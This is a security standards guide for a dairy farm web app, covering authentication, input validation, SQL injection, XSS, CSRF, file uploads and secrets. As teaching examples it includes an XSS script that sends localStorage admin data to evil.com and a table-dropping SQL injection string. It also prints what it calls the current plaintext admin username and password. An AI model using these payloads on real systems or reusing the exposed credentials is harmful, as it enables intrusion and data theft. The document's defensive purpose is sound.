# 🔒 Security Standards - Tasnim Dairy Farm

**Version**: 2.0.0  
**Purpose**: Comprehensive security requirements and vulnerability prevention  
**Scope**: Frontend, Backend, Database, and Infrastructure Security

---

## 🎯 Security Philosophy

**Security is not negotiable.** Every line of code must consider:
- **Confidentiality**: Protect sensitive data
- **Integrity**: Prevent unauthorized modifications
- **Availability**: Ensure system remains accessible
- **Authentication**: Verify user identity
- **Authorization**: Control access to resources

**Security is everyone's responsibility**, not just the security team's.

---

## 🔐 Authentication & Authorization

### **Current Authentication System**

```yaml
Implementation:
  Type: Simple credential check (localStorage)
  Credentials:
    Username: "admin"
    Password: "tasnim@2026"
  Storage: localStorage (client-side)
  Session: Persisted until logout
  
Security_Level: LOW (Development/Internal Use Only)

Known_Issues:
  ❌ No password hashing
  ❌ Credentials stored in plain text (localStorage)
  ❌ Vulnerable to XSS attacks
  ❌ No token expiration
  ❌ No session invalidation on server
  ❌ No brute force protection
  ❌ No role-based access control

Acceptable_Because:
  - Internal admin panel only
  - Not exposed to public
  - Planned for upgrade

Upgrade_Plan: Q2 2026 (JWT + bcrypt)
```

---

### **Planned Authentication Upgrade (JWT)**

```yaml
Target_Implementation:
  Type: JWT (JSON Web Tokens) + bcrypt
  Flow:
    1. Admin submits credentials
    2. Backend validates (bcrypt.compare)
    3. Backend generates JWT token
    4. Token sent in HTTP-only cookie
    5. Frontend includes token in requests
    6. Backend validates token on protected routes
  
  Storage: HTTP-only cookies (not localStorage)
  Expiration: 24 hours (refresh before expiry)
  Security: HTTPS only, SameSite=Strict

Security_Improvements:
  ✅ Passwords hashed with bcrypt (cost factor 10)
  ✅ Tokens not accessible via JavaScript (XSS protection)
  ✅ Token expiration enforced
  ✅ Server-side session control
  ✅ Brute force protection (rate limiting)
  ✅ HTTPS enforced in production

Implementation_Example:
  Backend (server.js):
    const bcrypt = require('bcrypt');
    const jwt = require('jsonwebtoken');
    
    router.post('/auth/login', async (req, res) => {
      const { username, password } = req.body;
      
      // Validate credentials
      const admin = await getAdmin(username);
      if (!admin || !await bcrypt.compare(password, admin.passwordHash)) {
        return res.status(401).json({ error: 'Invalid credentials' });
      }
      
      // Generate JWT
      const token = jwt.sign(
        { username, role: 'admin' },
        process.env.JWT_SECRET,
        { expiresIn: '24h' }
      );
      
      // Send HTTP-only cookie
      res.cookie('authToken', token, {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'strict',
        maxAge: 24 * 60 * 60 * 1000 // 24 hours
      });
      
      res.json({ success: true });
    });
  
  Middleware (authMiddleware.js):
    const jwt = require('jsonwebtoken');
    
    function authenticateToken(req, res, next) {
      const token = req.cookies.authToken;
      
      if (!token) {
        return res.status(401).json({ error: 'Authentication required' });
      }
      
      try {
        const decoded = jwt.verify(token, process.env.JWT_SECRET);
        req.user = decoded;
        next();
      } catch (error) {
        return res.status(403).json({ error: 'Invalid token' });
      }
    }
    
    module.exports = { authenticateToken };
  
  Protected_Routes:
    const { authenticateToken } = require('./middleware/authMiddleware');
    
    router.post('/api/founders', authenticateToken, async (req, res) => {
      // Only authenticated admins can create founders
    });

Priority: HIGH
Effort: 6-8 hours
Risk_Level: CRITICAL (test thoroughly)
```

---

## 🛡️ Input Validation & Sanitization

### **Critical Input Validation Rules**

```yaml
All_User_Input_Must_Be:
  1. Validated (type, format, length)
  2. Sanitized (remove dangerous characters)
  3. Escaped (for output)
  4. Never trusted

Backend_Validation_Required:
  ✅ All API endpoints validate input
  ✅ Never trust client-side validation alone
  ✅ Validate data types (string, number, boolean)
  ✅ Validate string lengths (max/min)
  ✅ Validate array contents
  ✅ Validate file types and sizes
  ✅ Reject unexpected fields

Frontend_Validation_Recommended:
  ✅ Improves user experience
  ✅ Provides immediate feedback
  ✅ Reduces unnecessary API calls
  ❌ NOT a security measure (easily bypassed)
```

### **Input Validation Examples**

#### **String Validation**
```javascript
// ❌ BAD: No validation
router.post('/api/founders', async (req, res) => {
  const { name, role } = req.body;
  await pool.query('INSERT INTO founders (name, role) VALUES ($1, $2)', [name, role]);
});

// ✅ GOOD: Comprehensive validation
router.post('/api/founders', async (req, res) => {
  const { name, role, responsibilities } = req.body;
  
  // Required field check
  if (!name || !role || !responsibilities) {
    return res.status(400).json({ error: 'Missing required fields' });
  }
  
  // Type check
  if (typeof name !== 'string' || typeof role !== 'string') {
    return res.status(400).json({ error: 'Invalid data types' });
  }
  
  // Length check
  if (name.length < 2 || name.length > 100) {
    return res.status(400).json({ error: 'Name must be 2-100 characters' });
  }
  
  if (role.length < 2 || role.length > 100) {
    return res.status(400).json({ error: 'Role must be 2-100 characters' });
  }
  
  // Array check
  if (!Array.isArray(responsibilities) || responsibilities.length === 0) {
    return res.status(400).json({ error: 'Responsibilities must be non-empty array' });
  }
  
  // Sanitize (trim whitespace)
  const sanitizedName = name.trim();
  const sanitizedRole = role.trim();
  
  // Proceed with database operation
  await pool.query(
    'INSERT INTO founders (name, role, responsibilities) VALUES ($1, $2, $3)',
    [sanitizedName, sanitizedRole, JSON.stringify(responsibilities)]
  );
  
  res.status(201).json({ success: true });
});
```

#### **Email Validation**
```javascript
function isValidEmail(email) {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailRegex.test(email) && email.length <= 254;
}

router.post('/api/contact', async (req, res) => {
  const { email, message } = req.body;
  
  if (!isValidEmail(email)) {
    return res.status(400).json({ error: 'Invalid email format' });
  }
  
  // Proceed...
});
```

#### **File Upload Validation**
```javascript
const multer = require('multer');

// ✅ GOOD: Strict file validation
const storage = multer.diskStorage({
  destination: './uploads/',
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
    cb(null, uniqueSuffix + '-' + file.originalname);
  }
});

const fileFilter = (req, file, cb) => {
  // Validate MIME type (not just extension)
  const allowedMimeTypes = ['image/jpeg', 'image/png', 'image/webp'];
  
  if (allowedMimeTypes.includes(file.mimetype)) {
    cb(null, true);
  } else {
    cb(new Error('Invalid file type. Only JPG, PNG, WEBP allowed.'));
  }
};

const upload = multer({
  storage: storage,
  limits: {
    fileSize: 5 * 1024 * 1024, // 5MB
    files: 1 // Only one file per request
  },
  fileFilter: fileFilter
});

router.post('/api/upload', upload.single('image'), (req, res) => {
  if (!req.file) {
    return res.status(400).json({ error: 'No file uploaded' });
  }
  
  // Additional validation: Check magic bytes (file signature)
  // This prevents renamed files (e.g., virus.exe renamed to image.jpg)
  // Implementation: Use file-type npm package
  
  res.json({ filename: req.file.filename });
});
```

---

## 🔒 SQL Injection Prevention

### **CRITICAL: Always Use Parameterized Queries**

```yaml
Rule: NEVER concatenate user input into SQL queries

Why_Dangerous:
  # User input: '; DROP TABLE founders; --
  const query = `SELECT * FROM founders WHERE name = '${userInput}'`;
  # Executes: SELECT * FROM founders WHERE name = ''; DROP TABLE founders; --'
  # Result: ENTIRE TABLE DELETED!

Always_Use_Parameterized:
  # PostgreSQL uses $1, $2, $3... placeholders
  const query = 'SELECT * FROM founders WHERE name = $1';
  const result = await pool.query(query, [userInput]);
  # Safe: Input treated as data, not code
```

### **Examples**

```javascript
// ❌ VULNERABLE TO SQL INJECTION
router.get('/api/blogs/search', async (req, res) => {
  const { category } = req.query;
  const query = `SELECT * FROM blogs WHERE category = '${category}'`;
  const result = await pool.query(query);
  res.json(result.rows);
});

// ✅ SAFE: Parameterized query
router.get('/api/blogs/search', async (req, res) => {
  const { category } = req.query;
  const query = 'SELECT * FROM blogs WHERE category = $1';
  const result = await pool.query(query, [category]);
  res.json(result.rows);
});

// ❌ VULNERABLE: Dynamic column name
router.get('/api/founders/sort', async (req, res) => {
  const { sortBy } = req.query;
  const query = `SELECT * FROM founders ORDER BY ${sortBy}`;
  const result = await pool.query(query);
  res.json(result.rows);
});

// ✅ SAFE: Whitelist allowed columns
router.get('/api/founders/sort', async (req, res) => {
  const { sortBy } = req.query;
  
  // Whitelist allowed sort columns
  const allowedColumns = ['name', 'role', 'created_at'];
  if (!allowedColumns.includes(sortBy)) {
    return res.status(400).json({ error: 'Invalid sort column' });
  }
  
  // Safe to use in query (validated against whitelist)
  const query = `SELECT * FROM founders ORDER BY ${sortBy}`;
  const result = await pool.query(query);
  res.json(result.rows);
});
```

---

## 🌐 CORS Security

### **Current CORS Configuration**

```yaml
File: backend/server.js

Current_Implementation:
  const corsOptions = {
    origin: process.env.CORS_ORIGIN?.split(',') || [
      'http://localhost:5173',
      'http://localhost:3000',
      'http://localhost:5000'
    ],
    credentials: true
  };
  
  app.use(cors(corsOptions));

Security_Concerns:
  ✅ GOOD: Origin whitelist (not wildcard *)
  ✅ GOOD: Credentials allowed (for cookies)
  ❌ ISSUE: Must ensure production URL included

Production_Check:
  CORS_ORIGIN: "https://tasnim-dairy-farm.netlify.app,http://localhost:5173"
  # Must include actual production domain

Common_Mistakes:
  ❌ Using origin: '*' (allows any site)
  ❌ Forgetting production URL (breaks frontend)
  ❌ Including trailing slash (won't match)
  ❌ Using HTTP in production (should be HTTPS)
```

---

## 🔐 XSS (Cross-Site Scripting) Prevention

### **What is XSS?**

```yaml
Definition: Injecting malicious JavaScript into web pages viewed by other users

Example_Attack:
  # User submits blog post with title:
  <script>
    fetch('https://evil.com/steal?data=' + localStorage.getItem('adminAuth'))
  </script>
  
  # If not escaped, script executes when admin views blog list
  # Result: Admin credentials stolen!

Prevention: Always escape user-generated content
```

### **React XSS Protection**

```yaml
Good_News: React escapes by default!

Safe_By_Default:
  <div>{userInput}</div>
  # Even if userInput = "<script>alert('xss')</script>"
  # React renders as text, not executed

Dangerous_Patterns:
  ❌ dangerouslySetInnerHTML (bypasses escaping)
  <div dangerouslySetInnerHTML={{ __html: userInput }} />
  # Only use if you sanitize first!
  
  ❌ href="javascript:..." links
  <a href={`javascript:${userInput}`}>Click</a>
  # Never use javascript: protocol
  
  ❌ Eval-like patterns
  eval(userInput);
  new Function(userInput)();
  setTimeout(userInput, 1000);

Safe_Patterns:
  ✅ Render as text (default)
  <div>{userInput}</div>
  
  ✅ If HTML needed, sanitize first
  import DOMPurify from 'dompurify';
  <div dangerouslySetInnerHTML={{ 
    __html: DOMPurify.sanitize(userInput) 
  }} />
```

---

## 🔒 CSRF (Cross-Site Request Forgery) Prevention

### **Current Status**

```yaml
Current_Implementation: No CSRF protection (yet)
Risk_Level: MEDIUM (admin panel only, not widely exposed)

What_Is_CSRF:
  # Evil site tricks user's browser into making request:
  <img src="https://api.tasnim-dairy.com/api/founders/1" method="DELETE">
  # If admin visits evil site while logged in, founder deleted!

Planned_Protection (with JWT upgrade):
  1. Use HTTP-only cookies for JWT
  2. Set SameSite=Strict on cookies
  3. Verify Origin/Referer headers
  4. Add CSRF token for state-changing requests

Implementation_Example:
  Backend:
    app.use((req, res, next) => {
      // Verify Origin or Referer header
      const origin = req.headers.origin || req.headers.referer;
      const allowedOrigins = process.env.CORS_ORIGIN.split(',');
      
      if (!allowedOrigins.some(allowed => origin?.startsWith(allowed))) {
        return res.status(403).json({ error: 'Invalid origin' });
      }
      
      next();
    });
```

---

## 📂 File Upload Security

### **Current File Upload Vulnerabilities**

```yaml
Current_Implementation:
  - Max file size: 5MB ✅
  - Allowed types: JPG, PNG, WEBP ✅
  - Storage: Local disk ✅
  - Validation: MIME type check ⚠️

Vulnerabilities:
  1. MIME Type Spoofing:
     - User can rename malicious file (e.g., virus.exe → image.jpg)
     - MIME type check only validates extension
     - Solution: Check file magic bytes (file signature)
  
  2. Path Traversal:
     - Malicious filename: ../../etc/passwd
     - Could overwrite system files
     - Solution: Sanitize filename, use unique names
  
  3. File Execution:
     - If upload directory is executable
     - Uploaded PHP/JS file could be executed
     - Solution: Serve uploads from different domain or disable execution
```

### **Improved File Upload Security**

```javascript
const multer = require('multer');
const path = require('path');
const crypto = require('crypto');

// ✅ Secure storage configuration
const storage = multer.diskStorage({
  destination: './uploads/',
  filename: (req, file, cb) => {
    // Generate cryptographically secure random filename
    const randomName = crypto.randomBytes(16).toString('hex');
    const ext = path.extname(file.originalname).toLowerCase();
    
    // Whitelist allowed extensions
    const allowedExts = ['.jpg', '.jpeg', '.png', '.webp'];
    if (!allowedExts.includes(ext)) {
      return cb(new Error('Invalid file extension'));
    }
    
    cb(null, randomName + ext);
  }
});

// ✅ Strict file validation
const fileFilter = (req, file, cb) => {
  // Validate MIME type
  const allowedMimes = ['image/jpeg', 'image/png', 'image/webp'];
  
  if (!allowedMimes.includes(file.mimetype)) {
    return cb(new Error('Invalid file type'), false);
  }
  
  cb(null, true);
};

// ✅ Size limits
const upload = multer({
  storage: storage,
  limits: {
    fileSize: 5 * 1024 * 1024, // 5MB
    files: 1,
    fields: 10,
    fileSize: 5 * 1024 * 1024
  },
  fileFilter: fileFilter
});

// ✅ Additional validation: Check magic bytes
const FileType = require('file-type');

router.post('/api/upload', upload.single('image'), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: 'No file uploaded' });
    }
    
    // Verify file type by magic bytes (not just extension)
    const fileType = await FileType.fromFile(req.file.path);
    const allowedTypes = ['image/jpeg', 'image/png', 'image/webp'];
    
    if (!fileType || !allowedTypes.includes(fileType.mime)) {
      // Delete uploaded file
      fs.unlinkSync(req.file.path);
      return res.status(400).json({ error: 'Invalid file format' });
    }
    
    res.json({ 
      filename: req.file.filename,
      url: `/uploads/${req.file.filename}`
    });
  } catch (error) {
    res.status(500).json({ error: 'Upload failed' });
  }
});
```

---

## 🔒 Environment Variables & Secrets

### **Secrets Management Rules**

```yaml
CRITICAL_RULES:
  1. ❌ NEVER commit secrets to Git
  2. ✅ Always use environment variables
  3. ✅ Add .env files to .gitignore
  4. ✅ Provide .env.example (without actual values)
  5. ✅ Rotate secrets regularly
  6. ✅ Use different secrets per environment

Secrets_To_Protect:
  - Database connection strings
  - API keys (Cloudinary, etc.)
  - JWT secret keys
  - Admin passwords
  - OAuth client secrets

Current_Status:
  ✅ .env in .gitignore
  ✅ .env.example provided
  ⚠️ Some credentials documented (for internal use)
  
Production_Secrets_Location:
  Frontend: Netlify environment variables
  Backend: Render.com environment variables
  Database: Neon dashboard
```

### **Example .env Structure**

```bash
# .env.example (committed to Git)
# Copy to .env and fill in actual values

# Database
DATABASE_URL=postgresql://user:password@host:5432/database

# Server
NODE_ENV=production
PORT=3000

# Security
JWT_SECRET=your-secret-key-here
ADMIN_PASSWORD_HASH=bcrypt-hash-here

# CORS
CORS_ORIGIN=https://your-frontend-domain.com

# File Upload
MAX_FILE_SIZE=5242880
UPLOAD_DIR=./uploads

# External Services (optional)
CLOUDINARY_CLOUD_NAME=your-cloud-name
CLOUDINARY_API_KEY=your-api-key
CLOUDINARY_API_SECRET=your-api-secret
```

---

## 🛡️ Security Headers

### **Essential HTTP Security Headers**

```javascript
// File: backend/server.js

// Install helmet
const helmet = require('helmet');

// Use helmet middleware
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"], // For Tailwind
      scriptSrc: ["'self'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", process.env.CORS_ORIGIN]
    }
  },
  hsts: {
    maxAge: 31536000, // 1 year
    includeSubDomains: true,
    preload: true
  },
  frameguard: { action: 'deny' }, // Prevent clickjacking
  noSniff: true, // Prevent MIME sniffing
  xssFilter: true // Enable XSS filter
}));

// Additional security headers
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  next();
});
```

---

## 📊 Security Audit Checklist

### **Monthly Security Review**

```yaml
Authentication:
  - [ ] Admin credentials strong and unique
  - [ ] No hardcoded passwords in code
  - [ ] Session management working correctly
  - [ ] Plan JWT upgrade on schedule

Input_Validation:
  - [ ] All API endpoints validate input
  - [ ] File upload validation working
  - [ ] No SQL injection vulnerabilities
  - [ ] No XSS vulnerabilities

CORS:
  - [ ] CORS includes production domain
  - [ ] No wildcard (*) CORS
  - [ ] Credentials properly configured

Dependencies:
  - [ ] Run: npm audit
  - [ ] Fix HIGH/CRITICAL vulnerabilities
  - [ ] Update dependencies quarterly

Environment:
  - [ ] No secrets in Git
  - [ ] .env files in .gitignore
  - [ ] Production secrets rotated

HTTPS:
  - [ ] Production uses HTTPS only
  - [ ] No mixed content warnings
  - [ ] SSL certificate valid

Monitoring:
  - [ ] Error logs reviewed for suspicious activity
  - [ ] Failed login attempts monitored
  - [ ] Unusual API patterns investigated
```

---

## 🚨 Security Incident Response

### **If Security Breach Suspected**

```yaml
Immediate_Actions:
  1. Isolate affected system
  2. Change all credentials
  3. Review logs for unauthorized access
  4. Notify team/stakeholders
  5. Document incident

Investigation:
  1. Identify entry point
  2. Assess data exposure
  3. Determine attack timeline
  4. Document findings

Recovery:
  1. Patch vulnerability
  2. Restore from backup if needed
  3. Reset all credentials
  4. Deploy fixes
  5. Monitor closely

Post_Incident:
  1. Update security documentation
  2. Add prevention checks
  3. Improve monitoring
  4. Train team on lessons learned
```

---

**Remember: Security is not a feature—it's a requirement. Stay vigilant, stay updated, stay secure.**
